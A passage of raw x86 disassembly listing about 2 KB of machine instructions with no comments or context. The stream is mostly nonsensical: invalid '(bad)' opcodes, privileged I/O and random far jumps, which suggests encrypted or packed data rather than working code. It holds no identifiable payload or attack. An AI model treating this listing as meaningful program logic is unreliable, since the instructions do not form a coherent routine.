  406706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406707:	cld    
  406708:	inc    edx
  406709:	arpl   WORD PTR [edi+0x55],dx
  40670c:	mov    ch,0x19
  40670e:	idiv   DWORD PTR [esp+eiz*2]
  406711:	push   es
  406712:	repnz retf 
  406714:	sti    
  406715:	or     esi,esi
  406717:	cmp    ebp,DWORD PTR [ecx]
  406719:	shr    BYTE PTR [ebp-0x27bf97e8],cl
  40671f:	(bad)  
  406720:	fcmovnu st,st(1)
  406722:	pop    esi
  406723:	xchg   esp,eax
  406724:	fsub   st(1),st
  406726:	mov    ds:0x2c675e47,al
  40672b:	sbb    DWORD PTR [ebx-0x5f4ff394],eax
  406731:	fdivr  DWORD PTR [esi]
  406733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406734:	mov    ds:0x85a38c28,al
  406739:	mov    esp,0xcdb94b6c
  40673e:	xchg   BYTE PTR [ebx],dh
  406740:	ja     0x406782
  406742:	jge    0x4066d9
  406744:	lds    esi,FWORD PTR [edi]
  406746:	inc    edx
  406747:	mov    ds,WORD PTR [edx]
  406749:	int3   
  40674a:	(bad)  
  40674c:	fcom   DWORD PTR gs:[edx]
  40674f:	adc    bl,BYTE PTR [ecx-0x6e]
  406752:	inc    esp
  406753:	adc    dh,BYTE PTR [ecx+0x7a]
  406756:	adc    ebx,0xffffffcf
  406759:	and    DWORD PTR [edx+0x2f],0x9b15de46
  406760:	popf   
  406761:	or     ebp,DWORD PTR [esi]
  406763:	sahf   
  406764:	or     al,0x1a
  406766:	and    dl,ch
  406768:	outs   dx,DWORD PTR ds:[esi]
  406769:	jmp    0x4067b2
  40676b:	add    BYTE PTR [ebx+0x49],ch
  40676e:	loopne 0x4067d0
  406770:	adc    ebp,ebp
  406772:	xchg   ecx,eax
  406773:	inc    edi
  406774:	pop    esp
  406775:	jmp    0x200f936a
  40677a:	pop    edi
  40677b:	pop    esp
  40677c:	ins    BYTE PTR es:[edi],dx
  40677d:	cmp    BYTE PTR [eax],bl
  40677f:	fidivr DWORD PTR [edi+0x63]
  406782:	dec    ecx
  406783:	loopne 0x4067b7
  406785:	dec    esi
  406786:	pop    ebx
  406787:	adc    eax,0x9672a2cb
  40678c:	mov    esp,edx
  40678e:	int    0x42
  406790:	mov    ch,ch
  406792:	or     al,0xc9
  406794:	call   0x9471650f
  406799:	mov    dh,ah
  40679b:	inc    esi
  40679c:	cmp    BYTE PTR [ecx],ch
  40679e:	addr16 ja 0x406810
  4067a1:	cmp    BYTE PTR [edx+0x7865b17e],bh
  4067a7:	in     al,dx
  4067a8:	loop   0x4067a0
  4067aa:	pop    ebx
  4067ab:	adc    eax,0x7573e76d
  4067b0:	mov    edx,0xd09b341d
  4067b5:	dec    edx
  4067b6:	outs   dx,BYTE PTR ds:[esi]
  4067b7:	sahf   
  4067b8:	imul   esp,DWORD PTR [ebp+0x6e],0x7e
  4067bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067bd:	stc    
  4067be:	int    0xf2
  4067c0:	pop    es
  4067c1:	outs   dx,DWORD PTR ds:[esi]
  4067c2:	push   0xffffffba
  4067c4:	push   eax
  4067c5:	stos   BYTE PTR es:[edi],al
  4067c6:	mov    DWORD PTR [ecx],ecx
  4067c8:	adc    eax,0x5765ec13
  4067cd:	sbb    eax,0x5c3c58c6
  4067d2:	ret    0xaaa2
  4067d5:	out    0x17,eax
  4067d7:	lods   al,BYTE PTR ds:[esi]
  4067d8:	push   edi
  4067d9:	(bad)  
  4067da:	cmp    BYTE PTR [ecx+0x2e],ch
  4067dd:	data16 sbb al,0xb6
  4067e0:	hlt    
  4067e1:	push   ebp
  4067e2:	jmp    eax
  4067e4:	or     DWORD PTR [eax],ebp
  4067e6:	add    eax,0x9b807dc2
  4067eb:	mov    cl,0x6b
  4067ed:	sub    DWORD PTR [ebx-0x36055177],0x534622c1
  4067f7:	mov    ah,0x76
  4067f9:	jo     0x40677f
  4067fb:	pop    esp
  4067fc:	ficom  DWORD PTR [ebp-0xa]
  4067ff:	pop    edi
  406800:	push   edx
  406801:	(bad)  
  406802:	fdiv   QWORD PTR [edx]
  406804:	xchg   ecx,eax
  406805:	in     eax,dx
  406806:	test   BYTE PTR [ecx],dh
  406808:	xor    BYTE PTR ds:0x97223843,ah
  40680e:	fdivr  QWORD PTR [edi]
  406810:	ja     0x40682e
  406812:	add    DWORD PTR [eax-0x1bddadda],ebp
  406818:	arpl   WORD PTR [eax+esi*1],bp
  40681b:	jmp    0xf0f1:0xa0f918de
  406822:	inc    ebp
  406823:	lods   al,BYTE PTR ds:[esi]
  406824:	lods   al,BYTE PTR ds:[esi]
  406825:	ret    0xffa9
  406828:	addr16 std 
  40682a:	int3   
  40682b:	aaa    
  40682c:	cmc    
  40682d:	fsub   QWORD PTR [edx+esi*8+0x19]
  406831:	sub    ebx,DWORD PTR cs:[edi+ecx*4+0x34db04c8]
  406839:	in     al,0xd3
  40683b:	push   ebx
  40683c:	jne    0x4068b4
  40683e:	(bad)  
  40683f:	mov    eax,fs
  406841:	(bad)  
  406842:	push   ds
  406843:	ins    BYTE PTR es:[edi],dx
  406844:	mov    eax,0xc3a3353d
  406849:	and    al,0xa0
  40684b:	stos   BYTE PTR es:[edi],al
  40684c:	lea    ebp,[ebx]
  40684e:	sub    edx,DWORD PTR [esi-0x2ea29ea7]
  406854:	(bad)  
  406855:	sbb    BYTE PTR [esi-0x2c4a76bb],ch
  40685b:	out    0x58,al
  40685d:	xor    bl,BYTE PTR [edx]
  40685f:	mov    edx,0x8dcd75a6
  406864:	test   BYTE PTR [esi],ah
  406866:	stos   BYTE PTR es:[edi],al
  406867:	mov    bl,0x35
  406869:	pop    ecx
  40686a:	cli    
  40686b:	jl     0x406841
  40686d:	mov    BYTE PTR [edx*8-0x29ef9bc6],0x6f
  406875:	ja     0x40682c
  406877:	mov    bl,BYTE PTR [ebx]
  406879:	mov    bh,0xf9
  40687b:	mov    ah,0xef
  40687d:	mov    cl,0x2e
  40687f:	pop    esp
  406880:	jle    0x4068ff
  406882:	mov    ch,0x55
  406884:	jle    0x4068af
  406886:	sub    DWORD PTR [edi-0x9],edi
  406889:	lea    esp,[eax+0x77]
  40688c:	cmp    eax,0xacbfa248
  406891:	popa   
  406892:	jecxz  0x406857
  406894:	jecxz  0x40683a
  406896:	xchg   ebp,eax
  406897:	mov    fs,WORD PTR [ecx+0x48]
  40689a:	call   0x14eee4a1
  40689f:	pusha  
  4068a0:	jmp    0x4068b7
  4068a2:	je     0x406828
  4068a4:	add    eax,0x81741963
  4068a9:	push   edi
  4068aa:	rcr    BYTE PTR [ebp-0x6648b319],0xbc
  4068b1:	das    
  4068b2:	or     BYTE PTR [edx-0x4c7a0ea3],bh
  4068b8:	jl     0x4068c8
  4068ba:	mov    bl,0xb4
  4068bc:	sbb    eax,0xe6ed6d00
  4068c1:	cmp    ebx,DWORD PTR [edx+0x55]
  4068c4:	push   esp
  4068c5:	mov    WORD PTR [edx-0x13],?
  4068c8:	stos   DWORD PTR es:[edi],eax
  4068c9:	cs dec ecx
  4068cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068cc:	nop
  4068cd:	dec    edi
  4068ce:	sub    BYTE PTR [edx],bh
  4068d0:	jmp    0xb208c0a
  4068d5:	fsubr  DWORD PTR [ebp-0x7d]
  4068d8:	mov    esi,0xee5dc92d
  4068dd:	popa   
  4068de:	mov    dh,0xaf
  4068e0:	dec    ecx
  4068e1:	test   bh,dh
  4068e3:	pop    eax
  4068e4:	mov    bl,0xdd
  4068e6:	neg    edi
  4068e8:	xchg   esp,eax
  4068e9:	(bad)  
  4068ea:	ss or  esi,ecx
  4068ed:	in     al,dx
  4068ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068ef:	jg     0x4068e5
  4068f1:	dec    ecx
  4068f2:	jg     0x406924
  4068f4:	retf   
  4068f5:	out    0xcc,eax
  4068f7:	cmp    ecx,esi
  4068f9:	push   es
  4068fa:	lods   al,BYTE PTR ds:[esi]
  4068fb:	inc    eax
  4068fc:	shl    BYTE PTR [edi-0x67],0xfd
  406900:	jmp    0x406913
  406902:	xchg   edi,eax
  406903:	adc    edi,esi
  406905:	xchg   esp,eax
  406906:	leave  
  406907:	into   
  406908:	jmp    0x37edd91f
  40690d:	dec    edx
  40690e:	sub    eax,0xc7ec7c14
  406913:	mov    al,0x4
  406915:	ins    BYTE PTR es:[edi],dx
  406916:	xor    al,0x34
  406918:	mov    ds:0xa426f84,al
  40691d:	shr    BYTE PTR [ecx+eiz*2-0x427c31e4],1
  406924:	fldenv [ecx]
  406926:	push   ecx
  406927:	daa    
  406928:	xchg   cl,dl
  40692a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40692c:	popf   
  40692d:	or     cl,al
  40692f:	mov    dh,0xf8
  406931:	or     al,ah
  406933:	out    dx,al
  406934:	sahf   
  406935:	stc    
  406936:	stc    
  406937:	(bad)  
  406938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406939:	rcr    BYTE PTR [eax+0x465a249f],cl
  40693f:	push   esp
  406940:	fcomp  DWORD PTR [eax]
  406942:	cmp    dh,bh
  406944:	mov    dl,0x57
  406946:	lahf   
  406947:	mov    eax,0x58f574bc
  40694c:	mov    bh,0xfe
  40694e:	mov    esi,0xdc210a07
  406953:	mov    bl,BYTE PTR [esp+esi*2]
  406956:	pusha  
  406957:	and    al,0x6a
  406959:	sti    
  40695a:	xchg   edi,eax
  40695b:	xchg   esp,esi
  40695d:	cmp    eax,0x30737431
  406962:	mov    dl,0x65
  406964:	add    DWORD PTR [ebp+0x10],esi
  406967:	xor    DWORD PTR [esi],0x9bb45b0c
  40696d:	scas   al,BYTE PTR es:[edi]
  40696e:	sub    ecx,ebp
  406970:	jge    0x406943
  406972:	cmp    DWORD PTR [ecx],0xf020b497
  406978:	mov    ebp,0x936cd901
  40697d:	retf   0xc629
  406980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406981:	dec    ecx
  406982:	out    0xd1,eax
  406984:	add    DWORD PTR [edi-0x40],0xffffff9e
  406988:	xchg   ecx,eax
  406989:	and    eax,0xc1bcbc5c
  40698e:	mov    bl,0x41
  406990:	mov    eax,0xf5d54b5b
  406995:	mov    ds:0x646fc8be,al
  40699a:	pop    esp
  40699b:	pop    edx
  40699c:	aad    0x72
  40699e:	cmp    BYTE PTR [ebp+0x5613e6f4],ah
  4069a4:	inc    edx
  4069a5:	test   DWORD PTR [ecx],esi
  4069a7:	and    DWORD PTR ds:0x2a1a307d,ebp
  4069ad:	ret    
  4069ae:	jb     0x406a08
  4069b0:	push   esp
  4069b1:	and    eax,0x337e2f60
  4069b6:	lds    ebp,FWORD PTR [ecx]
  4069b8:	xor    BYTE PTR [edx-0x5d],bh
  4069bb:	jb     0x4069b8
  4069bd:	sahf   
  4069be:	loopne 0x406984
  4069c0:	fincstp 
  4069c2:	adc    bl,BYTE PTR [ebx+0x4a]
  4069c5:	jmp    0xd3c4:0x7a5c053c
  4069cc:	ins    BYTE PTR es:[edi],dx
  4069cd:	mov    ebx,ds
  4069cf:	hlt    
  4069d0:	iret   
  4069d1:	push   cs
  4069d2:	div    BYTE PTR [ebx+0x58]
  4069d5:	mov    bh,0x41
  4069d7:	retf   
  4069d8:	repz adc DWORD PTR [ecx+0xe],0x772a8a75
  4069e0:	inc    esp
  4069e1:	sub    BYTE PTR [edi+0x280f5ab1],ch
  4069e7:	mov    eax,0xc31a50cd
  4069ec:	dec    ecx
  4069ed:	(bad)  
  4069ee:	lods   al,BYTE PTR ds:[esi]
  4069ef:	mov    ebx,0x7ba7cf83
  4069f4:	mov    ebp,0xc5469eec
  4069f9:	jnp    0x406a4f
  4069fb:	dec    esi
  4069fc:	ret    
  4069fd:	cmp    eax,edi
  4069ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a00:	adc    BYTE PTR ds:0x23050180,cl
  406a06:	popf   
  406a07:	mov    ecx,0xae366ad7
  406a0c:	push   edi
  406a0d:	adc    al,0x91
  406a0f:	(bad)  
  406a11:	fld    QWORD PTR [edx-0x31]
  406a14:	mov    eax,0x465febc6
  406a19:	adc    DWORD PTR ss:[ebp+0x33],ebp
  406a1d:	imul   edi,DWORD PTR [eax+0x29],0xffffffcf
  406a21:	mov    ss,eax
  406a23:	pop    ebp
  406a24:	out    0x1b,eax
  406a26:	or     ebp,DWORD PTR [edx]
  406a28:	adc    dh,BYTE PTR [eax-0x28]
  406a2b:	in     al,0x31
  406a2d:	fcmovnb st,st(1)
  406a2f:	out    0xd6,eax
  406a31:	ja     0x406a6c
  406a33:	dec    edi
  406a34:	in     eax,dx
  406a35:	mov    fs,WORD PTR [ecx]
  406a37:	sbb    ecx,DWORD PTR [edx+edi*1-0x45]
  406a3b:	xchg   DWORD PTR [ebp-0x16],edi
  406a3e:	stos   BYTE PTR es:[edi],al
  406a3f:	(bad)  
  406a40:	jmp    0x7689:0x935b0e4a
  406a47:	sub    BYTE PTR [eax-0x2eea671],0x1d
  406a4e:	popf   
  406a4f:	shr    BYTE PTR [edi-0x4b],cl
  406a52:	add    edx,DWORD PTR [ebp-0xc]
  406a55:	outs   dx,BYTE PTR ds:[esi]
  406a56:	jbe    0x406a82
  406a58:	or     BYTE PTR [ebx+eax*8+0x783d6a10],0xf1
  406a60:	mov    al,0xe1
  406a62:	imul   ebx,DWORD PTR [ebp+0x2d7cb850],0x77
  406a69:	lods   al,BYTE PTR ds:[esi]
  406a6a:	fist   WORD PTR [edx+0x33]
  406a6d:	sub    DWORD PTR [ebp+0x6d],ecx
  406a70:	nop
  406a71:	pop    ss
  406a72:	jnp    0x406a97
  406a74:	mov    ds:0xc4657993,al
  406a79:	jmp    0x242d:0x21fa4e1d
  406a80:	in     al,dx
  406a81:	xor    bl,ch
  406a83:	xchg   ebp,eax
  406a84:	cmc    
  406a85:	mov    bh,0xf4
  406a87:	cdq    
  406a88:	into   
  406a89:	xchg   ebp,eax
  406a8a:	mov    WORD PTR [edx+eax*8],es
  406a8d:	pop    edi
  406a8e:	imul   edi,esp,0xd62e7bcc
  406a94:	mov    eax,0xb3373edc
  406a99:	jmp    0x2bc:0xb5ecc706
  406aa0:	sahf   
  406aa1:	pop    ecx
  406aa2:	sti    
  406aa3:	iret   
  406aa4:	sti    
  406aa5:	btr    DWORD PTR [ebx],ecx
  406aa8:	fmul   st(4),st
  406aaa:	bound  edi,QWORD PTR [eax+0x4b2df894]
  406ab0:	xchg   BYTE PTR [ebx],dh
  406ab2:	xchg   edi,eax
  406ab3:	ret    0xa5f5
  406ab6:	call   edi
  406ab8:	pop    es
  406ab9:	and    edi,ecx
  406abb:	push   edi
  406abc:	(bad)  [ecx]
  406abe:	add    esi,esi
  406ac0:	test   eax,0x93b9b44a
  406ac5:	or     DWORD PTR [ebx+0x5f03c226],0x53d1e5ec
  406acf:	aam    0xc7
  406ad1:	cmp    eax,0x82f1fe38
  406ad6:	js     0x406b57
  406ad8:	je     0x406a7e
  406ada:	and    al,0xc0
  406adc:	bound  esp,QWORD PTR [ecx]
  406ade:	lock push ebx
  406ae0:	push   0xd7dae4ab
  406ae5:	mov    eax,ds:0x514bb545
  406aea:	inc    ecx
  406aeb:	(bad)  
  406aec:	jmp    0xb006c4f7
  406af1:	push   0x9c095276
  406af6:	ret    
  406af7:	pusha  
  406af8:	fidivr WORD PTR [ebx]
  406afa:	xor    eax,0xf7cf3639
  406aff:	xchg   ebx,eax
  406b00:	fdivr  DWORD PTR [esi]
  406b02:	mov    DWORD PTR [edx+0x68],ecx
  406b05:	std    
  406b06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b07:	dec    eax
  406b08:	xchg   ebp,eax
  406b09:	leave  
  406b0a:	hlt    
  406b0b:	mov    ebx,0x27c59826
  406b10:	sti    
  406b11:	add    al,0x84
  406b13:	pop    ss
  406b14:	xchg   dh,bl
  406b16:	xchg   ecx,eax
  406b17:	dec    ecx
  406b18:	pop    esi
  406b19:	aam    0xef
  406b1b:	shl    ebp,0xe
  406b1e:	test   DWORD PTR ss:[ebp-0x16],0x4a81e02f
  406b26:	pop    ds
  406b27:	push   eax
  406b28:	lock jnp 0x406b2a
  406b2b:	test   BYTE PTR [edi-0x77c7beae],ch
  406b31:	leave  
  406b32:	and    eax,0x892f714f
  406b37:	lea    ebp,[ebx+0x46daf0a3]
  406b3d:	add    DWORD PTR [ebp+0x2a],edx
  406b40:	push   0xc5441833
  406b45:	xchg   edi,eax
  406b46:	ret    0xb8a0
  406b49:	js     0x406ba3
  406b4b:	lea    esp,[ecx-0x65c1808b]
  406b51:	jae    0x406bc1
  406b53:	fimul  WORD PTR [edi+0x76]
  406b56:	dec    ebx
  406b57:	and    edi,DWORD PTR ds:0xbaade712
  406b5d:	push   ss
  406b5e:	pop    esi
  406b5f:	imul   edi,DWORD PTR [eax],0xffffffc5
  406b62:	adc    BYTE PTR [esp+ebp*1-0x3e19a3c4],ch
  406b69:	sbb    eax,DWORD PTR [ebx]
  406b6b:	xor    BYTE PTR [edx+0x62],cl
  406b6e:	out    0xb,al
  406b70:	gs dec ecx
  406b72:	mov    BYTE PTR [edi],bh
  406b74:	xor    DWORD PTR [ebx+0x7981e02f],eax
  406b7a:	jno    0x406b13
  406b7c:	cmp    al,0xc9
  406b7e:	ins    BYTE PTR es:[edi],dx
  406b7f:	dec    esi
  406b80:	retf   
  406b81:	push   eax
  406b82:	das    
  406b83:	test   BYTE PTR [ebp-0x647001f6],ah
  406b89:	dec    eax
  406b8a:	add    ah,ah
  406b8c:	push   ebx
  406b8d:	cmp    eax,0x814f1544
  406b92:	lods   al,BYTE PTR ds:[esi]
  406b93:	dec    esi
  406b94:	xor    bh,BYTE PTR [ebp-0x132ace2]
  406b9a:	cs mov ebp,esp
  406b9d:	retf   
  406b9e:	push   ds
  406b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ba0:	rcr    dh,0x4d
  406ba3:	outs   dx,DWORD PTR ds:[esi]
  406ba4:	cs sbb al,ch
  406ba7:	inc    ecx
  406ba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ba9:	sub    eax,0xb7881053
  406bae:	fimul  DWORD PTR [eax]
  406bb0:	jb     0x406b46
  406bb2:	(bad)  
  406bb3:	(bad)  
  406bb4:	mov    dl,0x4c
  406bb6:	lea    edx,[esi+0x0]
  406bb9:	xchg   BYTE PTR [ebx-0x4a],cl
  406bbc:	jno    0x406b5d
  406bbe:	inc    ecx
  406bbf:	jno    0x406c14
  406bc1:	aad    0x8f
  406bc3:	arpl   WORD PTR [edx],bx
  406bc5:	bound  eax,QWORD PTR [ebx]
  406bc7:	retf   0x52be
  406bca:	mov    bh,0x93
  406bcc:	cld    
  406bcd:	xor    al,0x97
  406bcf:	or     esp,eax
  406bd1:	pandn  mm1,mm0
  406bd4:	cs jecxz 0x406b73
  406bd7:	call   DWORD PTR [esi-0x72cc6174]
  406bdd:	cmp    dl,BYTE PTR [edi-0x4377b25d]
  406be3:	pushf  
  406be4:	sar    DWORD PTR [edi+0x2e7961fd],cl
  406bea:	fbstp  TBYTE PTR [edi+0x251eae45]
  406bf0:	out    dx,eax
  406bf1:	xchg   esi,eax
  406bf2:	(bad)  
  406bf3:	out    0x5f,eax
  406bf5:	ror    BYTE PTR ds:0x253e2278,0xf4
  406bfc:	mov    dl,0xf1
  406bfe:	jns    0x406bc4
  406c00:	cmp    ebx,edi
  406c02:	cmp    DWORD PTR [edi+0xd5eda0d],ecx
  406c08:	(bad)  
  406c09:	mov    esi,0xb561b118
  406c0e:	sub    esi,DWORD PTR [edx]
  406c10:	mov    DWORD PTR [ebx-0x18714449],edx
  406c16:	push   edi
  406c17:	mov    dl,0xe8
  406c19:	dec    edi
  406c1a:	jo     0x406bb6
  406c1c:	arpl   WORD PTR [eax*2-0xeadee8e],si
  406c23:	or     BYTE PTR [edx],dh
  406c25:	call   0xe45d:0xdaba3821
  406c2c:	out    0x1d,al
  406c2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c2f:	out    dx,al
  406c30:	(bad)  
  406c31:	or     ebp,DWORD PTR [edi+ebp*8-0x1b]
  406c35:	adc    DWORD PTR [edi+0x55a309ec],esi
  406c3b:	in     al,0x65
  406c3d:	sub    eax,0x41d8c1a
  406c42:	mov    ds:0x6fb1045a,al
  406c47:	add    bh,ch
  406c49:	xor    al,0x99
  406c4b:	sbb    BYTE PTR [ebx],dl
  406c4d:	data16 sti 
  406c4f:	sub    bl,ah
  406c51:	out    0xb5,al
  406c53:	mov    ecx,0xd281e95f
  406c58:	shl    eax,0x3
  406c5b:	jl     0x406c6a
  406c5d:	cmp    BYTE PTR [ebp-0x15],dl
  406c60:	jp     0x406c26
  406c62:	ds dec esi
  406c64:	inc    ebp
  406c65:	and    DWORD PTR [edx+0x30],esp
  406c68:	outs   dx,BYTE PTR ds:[esi]
  406c69:	lods   al,BYTE PTR ds:[esi]
  406c6a:	sbb    DWORD PTR [ecx-0x79],esi
  406c6d:	push   edi
  406c6e:	adc    al,0xfd
  406c70:	xor    ecx,0x4164f7c9
  406c76:	bound  ebx,QWORD PTR [ecx+0x1b7cdfa3]
  406c7c:	sbb    BYTE PTR [edx],cl
  406c7e:	jp     0x406cab
  406c80:	fwait
  406c81:	outs   dx,BYTE PTR ds:[esi]
  406c82:	inc    eax
  406c83:	add    BYTE PTR [esi-0x1198555c],ah
  406c89:	(bad)  
  406c8a:	jns    0x406cb1
  406c8c:	fs push ecx
  406c8e:	add    BYTE PTR [eax+0x5d],0x6f
  406c92:	arpl   WORD PTR [ebp-0x1701e316],di
  406c98:	cmp    ch,bh
  406c9a:	inc    esi
  406c9b:	cmp    bl,BYTE PTR [eax+eax*1]
  406c9e:	mov    eax,ds:0x3cecb9fc
  406ca3:	aas    
  406ca4:	adc    eax,0xcad79c28
  406ca9:	jecxz  0x406cd4
  406cab:	(bad)  
  406cac:	(bad)  
  406cad:	stos   DWORD PTR es:[edi],eax
  406cae:	ds push esi
  406cb0:	jnp    0x406cce
  406cb2:	mov    eax,ds:0x5409ec3b
  406cb7:	mov    dh,0xb1
  406cb9:	sahf   
  406cba:	pop    esi
  406cbb:	out    0x71,eax
  406cbd:	xchg   ebp,eax
  406cbe:	dec    edi
  406cbf:	(bad)  
  406cc0:	fst    DWORD PTR [ecx]
  406cc2:	mov    ebp,DWORD PTR [ecx+edi*8]
  406cc5:	imul   esi,DWORD PTR [edi],0x60
  406cc8:	adc    DWORD PTR [ebx+0x7a3ddc9e],edx
  406cce:	xor    DWORD PTR [ebx],esp
  406cd0:	and    BYTE PTR [ebp+0x35],cl
  406cd3:	sbb    edi,DWORD PTR [eax+0x4c737116]
  406cd9:	ret    0x542e
  406cdc:	(bad)
  406ce0:	inc    ebx
  406ce1:	out    dx,eax
  406ce2:	neg    BYTE PTR [ecx+0x50020af5]
  406ce8:	outs   dx,BYTE PTR ds:[esi]
  406ce9:	jns    0x406c77
  406ceb:	mov    ?,edx
  406ced:	scas   al,BYTE PTR es:[edi]
  406cee:	stos   BYTE PTR es:[edi],al
  406cef:	mov    BYTE PTR [ebx],dl
  406cf1:	xor    eax,0xa350e5a9
  406cf6:	imul   esp,esi,0x55
  406cf9:	dec    esi
  406cfa:	mov    bl,0x58
  406cfc:	sahf   
  406cfd:	pusha  
  406cfe:	shl    BYTE PTR [esi-0x2],0xaf
  406d02:	or     cl,ch
  406d04:	sti    
  406d05:	xchg   ebx,eax
  406d06:	mov    ebp,0x8ac9d756
  406d0b:	imul   esp,DWORD PTR ds:0x1d551b66,0x6c
  406d12:	cmp    eax,0x61ca42d1
  406d17:	jg     0x406d78
  406d19:	sub    ebx,edi
  406d1b:	jmp    0x406caa
  406d1d:	scas   eax,DWORD PTR es:[edi]
  406d1e:	jo     0x406d49
  406d20:	in     eax,0x8e
  406d22:	push   ebx
  406d23:	fst    QWORD PTR [edx*8+0x61a3b8bc]
  406d2a:	daa    
  406d2b:	push   ebx
  406d2c:	test   BYTE PTR [esi+0x23],al
  406d2f:	and    esp,DWORD PTR [ebx]
  406d31:	icebp  
  406d32:	push   eax
  406d33:	pop    edx
  406d34:	daa    
  406d35:	dec    ecx
  406d36:	sbb    eax,0x59e786b9
  406d3b:	add    edx,DWORD PTR [edx]
  406d3d:	dec    ebx
  406d3e:	push   ds
  406d3f:	fdivr  st,st(5)
  406d41:	mov    al,ds:0xf70c2a57
  406d46:	imul   ecx,DWORD PTR [edx+0x1c55baa6],0x172a6eb4
  406d50:	cld    
  406d51:	inc    ebx
  406d52:	jnp    0x406d0a
  406d54:	push   ss
  406d55:	frstor [edi]
  406d57:	retf   0xfc15
  406d5a:	jns    0x406d2e
  406d5c:	push   esi
  406d5d:	jg     0x406d87
  406d5f:	mov    edx,es
  406d61:	add    al,BYTE PTR [edi-0x1ff13521]
  406d67:	xchg   BYTE PTR [ebp+0x7982ee41],al
  406d6d:	lock jge 0x406d96
  406d70:	js     0x406d29
  406d72:	mov    dl,0x91
  406d74:	sub    ah,ah
  406d76:	mov    ecx,0xfe350dae
  406d7b:	sub    BYTE PTR [eax],dh
  406d7d:	xor    esp,ebx
  406d7f:	cwde   
  406d80:	repnz xor dh,BYTE PTR [ecx]
  406d83:	mov    ds:0xc5327ff3,eax
  406d88:	pop    ss
  406d89:	js     0x406d55
  406d8b:	fsub   QWORD PTR [ecx-0x5d8ea79a]
  406d91:	arpl   WORD PTR [ebp+0x29dee7af],di
  406d97:	cmc    
  406d98:	mov    ebx,0x5a875660
  406d9d:	mov    ebx,DWORD PTR [edi]
  406d9f:	cmp    edi,esi
  406da1:	test   BYTE PTR ds:0x39e6f7d,0x43
  406da8:	stos   BYTE PTR es:[edi],al
  406da9:	leave  
  406daa:	mov    edi,0xe55517f1
  406daf:	push   ebx
  406db0:	jmp    0x2cfbc858
  406db5:	cmp    ebp,DWORD PTR [edi+edi*4+0x2d24d9d6]
  406dbc:	ins    DWORD PTR es:[edi],dx
  406dbd:	xor    dl,ah
  406dbf:	cmp    BYTE PTR [ebx+0x35e0ab83],ch
  406dc5:	out    0xca,al
  406dc7:	xchg   cl,bl
  406dc9:	xlat   BYTE PTR ds:[ebx]
  406dca:	jecxz  0x406dbd
  406dcc:	es cmp eax,0x5df0e3b
  406dd2:	add    eax,DWORD PTR [eax+ebp*8+0x176803df]
  406dd9:	adc    DWORD PTR [edi-0x1],ebx
  406ddc:	jmp    0xe1f3:0x91ceebe8
  406de3:	dec    eax
  406de4:	test   ch,bl
  406de6:	adc    BYTE PTR [eax+esi*1],bh
  406de9:	ja     0x406dc6
  406deb:	cmp    BYTE PTR [edx],bh
  406ded:	add    ah,BYTE PTR [eax+0x60]
  406df0:	and    BYTE PTR [ecx],0xfa
  406df3:	pop    ecx
  406df4:	fisubr WORD PTR [eax+0x3d]
  406df7:	inc    edi
  406df8:	aad    0x79
  406dfa:	outs   dx,DWORD PTR ds:[esi]
  406dfb:	push   ebp
  406dfc:	or     al,0xd4
  406dfe:	push   esi
  406dff:	cwde   
  406e00:	xchg   ebp,eax
  406e01:	xchg   ebx,eax
  406e02:	adc    BYTE PTR [edx+0x28b05c65],dh
  406e08:	pop    ebp
  406e09:	dec    ebp
  406e0a:	cli    
  406e0b:	add    BYTE PTR ds:0x702fe2db,0xd3
  406e12:	lahf   
  406e13:	sti    
  406e14:	sbb    BYTE PTR [ebx+0x4df1d590],0x99
  406e1b:	retf   
  406e1c:	idiv   esp
  406e1e:	cld    
  406e1f:	mov    ecx,0xc8c2450
  406e24:	add    BYTE PTR [ebp+0x318412e0],ah
  406e2a:	xlat   BYTE PTR ds:[ebx]
  406e2b:	inc    ebx
  406e2c:	xchg   BYTE PTR [edi-0x38],ah
  406e2f:	dec    edi
  406e30:	rcr    DWORD PTR [edx-0x6],1
  406e33:	push   ecx
  406e34:	pop    eax
  406e35:	stc    
  406e36:	cmc    
  406e37:	repz inc edi
  406e39:	popf   
  406e3a:	xchg   ebx,edx
  406e3c:	(bad)  
  406e3d:	fcmovnbe st,st(0)
  406e3f:	bnd jge 0x406e82
  406e42:	sahf   
  406e43:	lods   eax,DWORD PTR ds:[esi]
  406e44:	pop    ss
  406e45:	mov    edx,0x3d3fc244
  406e4a:	xchg   ebx,eax
  406e4b:	in     eax,0x5
  406e4d:	jmp    0xba37:0x806a09fc
  406e54:	cdq    
  406e55:	mov    BYTE PTR [edi+0x74],dh
  406e58:	mov    edx,0x59755c3c
  406e5d:	pop    ss
  406e5e:	add    ebx,DWORD PTR [eax-0x34b54ec3]
  406e64:	adc    al,0xd9
  406e66:	sbb    al,0xca
  406e68:	push   0xc9392555
  406e6d:	or     eax,0x6ccbf218
  406e72:	outs   dx,DWORD PTR ds:[esi]
  406e73:	inc    eax
  406e74:	mov    eax,ds:0xda51bb21
  406e79:	es inc esp
  406e7b:	shl    dl,0x8
  406e7e:	or     eax,0xfce21b76
  406e83:	sbb    edi,ebx
  406e85:	xor    esi,0x36
  406e88:	addr16 inc ebp
  406e8a:	bound  ebx,QWORD PTR fs:[edi+ebp*4]
  406e8e:	or     dl,BYTE PTR [ebx-0x3f]
  406e91:	retf   0x5dae
  406e94:	out    0xbd,eax
  406e96:	pop    es
  406e97:	xchg   esi,eax
  406e98:	add    eax,0x4c7dd939
  406e9d:	sbb    eax,0x632e7b89
  406ea2:	inc    esi
  406ea3:	sti    
  406ea4:	jne    0x4343d55d
  406eaa:	jmp    0x406e5c
  406eac:	or     eax,0xc0424d85
  406eb1:	mov    WORD PTR [esi],fs
  406eb3:	pop    es
  406eb4:	mov    edi,0x5aa2a343
  406eb9:	lods   eax,DWORD PTR ds:[esi]
